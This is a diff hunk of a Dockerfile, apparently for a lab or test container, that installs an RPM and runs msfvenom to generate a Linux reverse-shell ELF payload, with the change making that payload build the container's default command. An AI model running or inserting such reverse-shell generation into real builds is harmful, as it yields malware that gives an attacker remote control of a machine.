@@ -22,4 +22,5 @@ ADD $RPM /tmp/
 RUN dnf install -y /tmp/$RPM libxcrypt-compat-4.4.26-4.fc35.x86_64
 RUN msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/rev.elf
 WORKDIR /tmp
-ENTRYPOINT [ "python3", "-m", "http.server", "8081" ]
+CMD [ "msfvenom", "-p", "linux/x64/shell_reverse_tcp", "LHOST=127.0.0.1", "LPORT=4444", "-f", "elf", "-o", "/tmp/rev.elf"]
+#ENTRYPOINT [ "python3", "-m", "http.server", "8082" ]
